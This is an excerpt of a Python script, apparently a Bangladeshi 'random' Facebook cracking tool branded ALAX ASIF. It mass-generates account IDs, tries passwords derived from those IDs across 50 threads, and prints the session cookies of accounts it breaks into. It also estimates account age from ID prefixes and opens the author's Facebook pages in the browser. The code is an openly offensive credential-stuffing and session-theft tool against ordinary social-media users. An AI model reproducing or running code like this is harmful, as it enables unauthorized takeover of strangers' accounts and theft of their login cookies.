...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/ASIFCYBER')
logo = ("""\033[1;32m
   _  ______  ___  _  ____  __                               / |/ / __ \/ _ \| |/_/\ \/ /                              /    / /_/ / , _/>  <   \  /                              /_/|_/\____/_/|_/_/|_|   /_/                               ===============================================
[≈] DEVELOPER   :  ALAX ASIF                               [≈] FACEBOOK    :  ALAX ASIF GAMING                        [≈] VERSION     :  1.5                                     [≈] TOOL        :  RANDOM-/PAID                              ===============================================""")
def linex():
	print('\033[1;93m==============================================')
loop = 0
oks = []
...
def clear():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/mobarok.hossan.37819/')
    print(logo)
...
def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :ASIF = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :ASIF = '√ 2009'
        elif uid[:8] in ['10000000']        :ASIF = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:ASIF = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:ASIF = ' 2010'
        elif uid[:6] in ['100001']          :ASIF = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :ASIF = '√ 2011/2012'
        elif uid[:6] in ['100004']          :ASIF = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :ASIF = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :ASIF = '√ 2014/2015'
        elif uid[:6] in ['100009']          :ASIF = '√ 2015'
        elif uid[:5] in ['10001']           :ASIF = '√ 2015/2016'
        elif uid[:5] in ['10002']           :ASIF = '√ 2016/2017'
        elif uid[:5] in ['10003']           :ASIF = '√ 2018/2019'
        elif uid[:5] in ['10004']           :ASIF = '√ 2019/2020'
        elif uid[:5] in ['10005']           :ASIF = '√ 2020'
        elif uid[:5] in ['10006','10007','']:ASIF = '√ 2021'
        elif uid[:5] in ['10008']           :ASIF = '√ 2022'
        elif uid[:5] in ['10009']           :ASIF = '√ 2023'
        else:ASIF=''
...
def ASIF():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\x1b[1;92m\033[1;37m ━\x1b[1;92m INPOUT LIMITED: '+tl)
        print(f"\033[1;93m==============================================")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ASIF-OK🍁] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;33m [ASIF-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;95m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s [ASIF][%s|%s][OK:%s]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
def superuser():
    ...
    if id in Mehedi:
        ...
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100068774077707")
        time.sleep(3.0)
